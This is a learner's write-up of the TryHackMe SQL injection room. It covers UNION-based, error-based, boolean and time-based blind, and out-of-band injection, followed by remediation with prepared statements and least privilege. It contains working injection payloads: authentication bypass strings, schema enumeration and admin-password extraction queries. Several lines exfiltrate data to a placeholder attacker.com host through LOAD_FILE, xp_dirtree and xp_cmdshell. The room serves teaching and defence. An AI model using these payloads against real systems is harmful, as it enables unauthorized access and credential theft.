**TryHackMe Room:** [SQL Injection Introduction](https://tryhackme.com/room/sqlinjectionintroduction)

This write-up covers my understanding of the room and the key concepts I took away from it.

# SQL Injection Introduction

SQL Injection (SQLi) is one of the most well-known web application vulnerabilities.

I had heard about SQLi since I started using Linux at university. I was also familiar with `sqlmap`, the SQL injection tool included in Kali Linux, but I never actually used it or took the time to understand how SQL injection worked.

At the time, I had a fairly simplistic understanding of it. I thought SQLi was essentially a form of command-line injection against a database where an attacker entered some kind of "magic code" and gained unauthorized access to sensitive information.

Years later, I am finally learning the underlying concepts and getting hands-on experience with SQL injection through TryHackMe.

The biggest difference between what I understood before and what I understand now is that SQL injection is not about a magic payload. It is fundamentally about untrusted user input becoming part of a SQL query in a way that changes the intended meaning of that query.

But now, years later, I am learning the concept and getting hands on it on TryHackMe.

## SQL Essentials for Injections

Before understanding SQL injection, it helps to understand some SQL features that commonly appear in injection techniques.

### SQL Comments

SQL supports several ways of writing comments. Two commonly encountered syntaxes are `--` and `/* */`. `--` is commonly used for commenting out the remainder of a line, while `/* */` can be used for both single-line and multi-line comments.

For example, a normal query might look like:

```sql-text
SELECT * FROM users WHERE username='admin' AND password='secret';
```

And here is the same code with comment in the middle:

```sql-text
SELECT * FROM users WHERE username='admin'-- AND password='secret';
```

The commands after `--` is commented out so they are ignored.

This is particularly useful in SQL injection because an attacker can sometimes use comments to remove the application's remaining conditions from the query.

### UNION

`UNION` combines the results of two `SELECT` statements.

```sql-text
SELECT name, email FROM users UNION SELECT id, name FROM admins; 
```

The two queries must return the same number of columns, and the corresponding columns must have compatible data types.

In SQL injection, `UNION SELECT` can be useful when the application displays database query results to the user. An attacker may be able to append another query and retrieve information from a different table.

### LIKE And Wildcards

`LIKE` can be used for pattern matching. Example:

```sql-text
SELECT * FROM users WHERE username LIKE "adm%";
```

The `%` wildcard matches zero or more characters. Therefore, this query could return usernames beginning with `adm`, such as `admin` or `administrator`.

This becomes particularly useful in blind SQL injection because a condition can be constructed to ask questions such as:

> "Does the database name begin with `s`?"

### LIMIT

`LIMIT` controls how many rows a query returns. Example:

```sql-text
SELECT name FROM users LIMIT 1;
```

This returns only the first row.

You can also specify an offset:

```sql-text
SELECT name FROM users LIMIT 2, 1;
```
In MySQL, this means skip the first two rows and return one row, which gives us the third row.

### String Functions

String functions are particularly useful when extracting multiple pieces of information through a single result.

1. `group-concat()`

It combines values from multiple rows into a single string. Example:

```sql-text
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
```

It will return something like `admin:pass123<br>martin:secret<br>jim:work456`.

2. `CONCAT()`

It joins multiple strings together. Example:

```sql-text
SELECT CONCAT(username, ':', password) FROM users;
```

It will return something like `admin:pass123`.

### `information_schema`

MySQL provides an `information_schema` database containing metadata about databases, tables, columns, and other database objects.

Two particularly useful tables are:

- `information_schema.tables` — contains information about tables.
- `information_schema.columns` — contains information about columns.

For SQL injection enumeration, these tables can provide useful information about the structure of the database.

## What is SQL Injection?

So, how does SQL injection actually work?

Before learning about it properly, I used to think that you were somehow "inside" a database and could enter a special command that would automatically open tables for you.

That is not really what is happening.

The vulnerability occurs when an application takes user-controlled input and directly incorporates it into a SQL query without properly separating data from SQL code.

For example, imagine an article website with a URL such as: `https://website.thm/article?id=1,`, the application might construct a query like:

```sql-text
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

The problem appears when the application builds that query by directly concatenating the user's input:

```php
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

The value supplied through id becomes part of the SQL statement itself.

For example, an attacker could potentially provide: `1 OR 1=1--` which could result in:

```sql-text
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

The important part here is `OR 1=1`.

Because `1=1` is always true, the `WHERE` condition can become true for rows that would not normally match the intended `id` condition. The comment can also prevent the application's remaining condition from being evaluated as part of the original query.

The exact behavior depends on the query structure, database engine, and how the application handles the input, but the underlying problem is the same: user input has been allowed to alter the structure and meaning of the SQL query.

There are three types of SQL injections:

- In-Band SQL Injection
- Blind SQL Injection
- Out-of-Band SQL Injection

Some simple inputs that can be useful when testing whether an input might be injectable include:

- `'`
- `"`
- `;--`
- `OR 1=1` (or `OR 1=1;`)

These are only starting points. An application may suppress database errors or behave differently depending on the database engine and how the query is constructed, so the response needs to be examined carefully.

## In-Band SQL Injection

In-band SQL injection is where the attacker uses the same communication channel to both send the injection and receive the results.

Two common forms are error-based and UNION-based SQL injection.

### Error-Based SQL Injection

Error-based SQL injection relies on database errors being exposed by the application.

For example, submitting an unexpected single quote `'` might cause an error such as:

```sql-error
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1
```

An error like this can reveal that user input is being incorporated into a SQL query and can sometimes reveal useful information about the underlying database.

Modern applications often hide database errors from users, so this technique is not always available.

### Union-Based SQL Injection

UNION-based injection can be used when the application returns the results of a query.

The general process provided in the room was:

1. Determine the number of columns.
2. Identify which columns are displayed.
3. Identify the current database.
4. Enumerate tables.
5. Enumerate columns.
6. Extract relevant data.

1. Determining the number of columns

Example:

```sql-text
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

If the third payload succeeds while the previous ones fail because of a column-count mismatch, the original query is likely returning three columns.

The important concept is that a `UNION` query must have the same number of columns as the original `SELECT`.

2. Identifying which columns to display

Once the column count is known, values can be placed in different positions:

```sql-text
0 UNION SELECT 1,2,3
```

The application's response can then reveal which columns are actually reflected in the page.

3. Extract the database name

Once a suitable output column has been identified, database metadata can be queried:

```sql-text
0 UNION SELECT 1,2,database()
```

`database()` returns the name of the current database.

4. Enumerating tables

The information_schema.tables table can then be queried:

```sql-text
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

This can reveal the tables belonging to the target database.

5. Enumerating columns

After identifying a target table, its columns can be enumerated:

```sql-text
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

In a real assessment, it would also be important to restrict this by `table_schema` when necessary, especially if tables with the same name exist in multiple databases.

6. Extracting data

Finally, relevant data can be queried from the target table:

```sql-text
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

This demonstrates the general progression of UNION-based SQL injection:

column count -> reflected columns -> database -> tables -> columns -> data

## Blind SQL Injection

Blind SQL injection is different from in-band SQL injection because the application does not directly return the results of the injected query.

Instead, the attacker has to infer information from some other observable behavior.

Two techniques covered in the room were:

- Boolean-based blind SQL injection
- Time-based blind SQL injection

## Authentication Bypass

Authentication bypass is a common SQL injection scenario, although it is not itself a separate category of blind SQL injection.

A normal authentication query might look like:

```sql-text
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

If the application directly incorporates the username input into the query, an input such as: `' OR 1=1; --` could potentially produce something similar to:

```sql-text
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

The important parts are:

- `username=''`— the original username comparison.
- `OR 1=1` — adds a condition that is always true.
- `--` — comments out the remainder of the original query.

As a result, the password condition may no longer affect the query.

Another possibility is targeting a specific account: `admin'--` which could produce:

```sql-text
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```

Again, the exact behavior depends on how the application constructs and executes the query.

Other variations can sometimes be tested depending on the application's quoting and database engine:

- `' OR 1=1;--` - This is the classic one.
- `' OR 1=1#` - `#` as the comment character instead of `--`.
- `" OR 1=1--` - Double quote `"` instead of `'`.

It can also be worth testing whether the application incorporates the username, password, or both fields into the SQL query.

## Boolean-Based Blind SQL Injection

Boolean-based blind SQL injection relies on a true/false difference in the application's response.

For example, imagine an endpoint that checks whether a username is already taken: `https://website.thm/checkuser?username=admin`. The application might return: `{taken: true}` or `{taken: false}`. Instead of directly displaying database results, the application gives us an observable Boolean response.

1. Confirming injection 

One technique is to inject a condition that should always be true:

```sql-text
SELECT * FROM users WHERE username = 'admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- LIMIT 1;
```
The `%` wildcard can match any database name, so the condition should evaluate to true.

2. Identifying the Database Name

Once the behavior has been confirmed, the database name can be discovered character by character.

For example:

```sql-text
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```

If the application responds with the "true" condition, the database name starts with `a`. The process can then continue: `s%`, `sq%`, `sqli%`, `...` until the database name is identified.

3. Getting the table and column name.

```sql-text
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```

Instead of directly receiving the table name, I can infer it from whether the application's response indicates true or false.

Common table names can sometimes be tested first, and once a likely name has been found, the wildcard can be removed to confirm an exact match.

The important idea is that the database is effectively being asked a series of yes/no questions.

## Time-Based Blind SQL Injection

Time-based blind SQL injection is useful when the application provides no meaningful visible output—not even a useful Boolean response.

In this situation, the response time itself becomes the signal.

MySQL provides the `SLEEP()` function, which pauses execution for a specified number of seconds. By placing it behind a condition, we can make the database pause only when that condition is true.

For example:

```sql-text
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

If the database name begins with s, the database should execute the `SLEEP(5)` call and the response should be noticeably delayed.

Here is the scenario from the practical lab (from the task 6):

1. Finding the column count. 

As with UNION-based injection, the correct number of columns must first be determined.

For example:

```sql-text
admin123' UNION SELECT SLEEP(5);--
```

```sql-text
admin123' UNION SELECT SLEEP(5), 2;--
```

If the second payload produces the expected delay, this suggests that two columns are required.

2. Identifying the Database Name

The same character-by-character approach can then be used:

```sql-text
admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
```

```sql-text
admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--
```

Eventually, the exact database name can be tested:

```sql-text
admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--
```

A noticeable delay indicates that the condition evaluated as true.

3. Enumerating tables

Once the database name is known, `information_schema.tables` can be queried:

```sql-text
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
```

```sql-text
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'us%';--
```

Finally:

```sql-text
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users';--
```

This allows the table name to be discovered without directly displaying it.

4. Extracting the admin password.

The same process can be applied to individual values.

For example:

```sql-text
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
```

If the response is delayed, the password begins with `4`.

The next character can then be tested:

```sql-text
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '49%';--
```

And eventually:

```sql-text
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--
```

This demonstrates why blind SQL injection can be significantly more tedious than in-band injection: instead of receiving the data directly, you have to reconstruct it through a series of observations.

## Out-of-Band SQL Injection

Out-of-band (OOB) SQL injection uses a different communication channel to retrieve information.

It can be useful when the application does not return query results and does not provide a reliable Boolean or timing signal, provided that the database server is capable of making outbound network requests.

Conceptually, there are two channels:

- The attacker/application channel — where the injection is delivered.
- The out-of-band data channel — where the database server makes an outbound request that can carry information to infrastructure controlled by the tester.

For example, DNS can sometimes be used as an out-of-band channel because DNS lookups can leave the database server even when the application does not display the result of the SQL query.

## DNS Exfiltration With MySQL

One technique discussed in the room uses MySQL's LOAD_FILE() function to trigger an external lookup.

For example:

```sql-text
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

Conceptually:

- `SELECT database()` retrieves the current database name.
- `CONCAT ()` constructs a string containing that value.
- `LOAD_FILE()` attempts to read the resulting path.

For example, if the database is called `webapp_db`, the generated path could contain:`\\webapp_db.attacker.com\share`. The important concept is that the database does not need to display the extracted value directly. Instead, the value is embedded into an external request.

## MSSQL Techniques

Microsoft SQL Server provides different mechanisms that can be abused for out-of-band interaction.

For example, `xp_dirtree` can cause SQL Server to access a network path:

```sql-text
EXEC master..xp_dirtree '\\attacker.com\share';
```

If the server attempts to resolve or access the remote path, the resulting network interaction can potentially be observed.

Another SQL Server feature is `xp_cmdshell`, which can execute operating-system commands when it is enabled:

```sql-text
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

`xp_cmdshell` is particularly sensitive because it crosses the boundary from database functionality into operating-system command execution. It is normally disabled in many environments and should not be enabled unnecessarily.


## Remediation and Prevention

Understanding SQL injection from an attacker's perspective is useful, but understanding how to prevent it is equally important.

## Prepared Statements (Parameterized Queries)

The most important defense is to use parameterized queries / prepared statements.

A vulnerable PHP example:

```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

Here, the user's input is directly concatenated into the SQL query.

A parameterized PDO version looks like:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

The `?` is a parameter placeholder. The user's input is treated as data rather than being interpreted as part of the SQL statement.

For example, an input such as `' OR 1=1;--` would be passed as a value rather than changing the structure of the SQL query.
 
The same principle applies in Python:
 
```python
 query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

Parameterized:

```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

The `%s` is a parameter placeholder for the database driver. The driver handles the parameter binding rather than treating the value as SQL syntax.

### Input Validation

Input validation adds another layer of protection by checking whether incoming data matches what the application expects.

For example, if an application expects a numeric ID, it can reject anything that is not numeric:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

Allowlisting is generally preferable to trying to identify every possible malicious string. If a parameter is supposed to contain a number, accept numbers rather than attempting to maintain a list of every string that could be malicious.

Input validation should complement parameterized queries rather than replace them.

### Escaping User Input

Escaping attempts to prevent special characters from being interpreted as SQL syntax.

For example, depending on the SQL context, a quote might be escaped `'` becomes something like `\'`. 

However, escaping is database-, context-, and encoding-dependent and is more fragile than using parameterized queries.

Therefore, parameterized queries should be the primary defense rather than relying on manual escaping.

### Principle of Least Privilege

The database account used by an application should have only the permissions it actually needs.

For example:

- A read-only application should ideally have only the required SELECT privileges.
- An application should not connect to the database as root or sa.
- Sensitive tables should not be accessible to application accounts unless they are genuinely required.
- Administrative database privileges should be separated from normal application privileges.

This does not prevent SQL injection itself, but it can significantly reduce the potential impact if an injection vulnerability exists.

### Web Application Firewalls (WAFs)

A Web Application Firewall (WAF) can inspect incoming requests and block or flag traffic that matches known attack patterns.

For example, a WAF might detect patterns commonly associated with SQL injection such as `' OR 1=1` or `UNION SELECT`.

However, a WAF should be considered an additional layer of defense rather than the primary fix.

If an application is vulnerable to SQL injection, the underlying vulnerability should still be fixed with secure query construction and appropriate input handling.

## Practical

The practical portion of this room was relatively straightforward, and the room itself provides a step-by-step guide through the exercises.

Rather than reproducing the entire walkthrough here, I focused this write-up on the concepts and techniques that I learned from the practical exercises.

The practical work helped me connect the theory to an actual vulnerable application, particularly the progression from identifying an injection point to enumerating database information.

## Conclusion

One of the things I found interesting about this room was realizing how much my understanding of SQL injection had changed since university.

Back when I was learning to code, writing something like `$_GET['username']` or `$_GET['id']` gave me a satisfying feeling because I was learning how to take user input and use it dynamically in an application.

At the same time, I remember being told that directly putting user input into SQL queries was bad practice because it could lead to SQL injection. I understood that it was "dangerous," but I did not really understand why.

I also knew about tools such as `sqlmap`, but I was treating SQL injection almost like a collection of magic commands rather than understanding the underlying mechanics.

This room changed that for me.

I now understand that SQL injection is fundamentally about breaking the boundary between data and SQL code. By controlling how user input is incorporated into a query, an attacker may be able to change the query's logic, retrieve information, bypass authentication, or infer information through indirect channels.

More importantly, I can now see the connection between the vulnerable code I wrote years ago and the security consequences behind it.

That makes SQL injection much more than just another vulnerability to memorize. It is a good example of how a small decision in application code—such as directly concatenating user input into a SQL query—can completely change the security properties of an application.
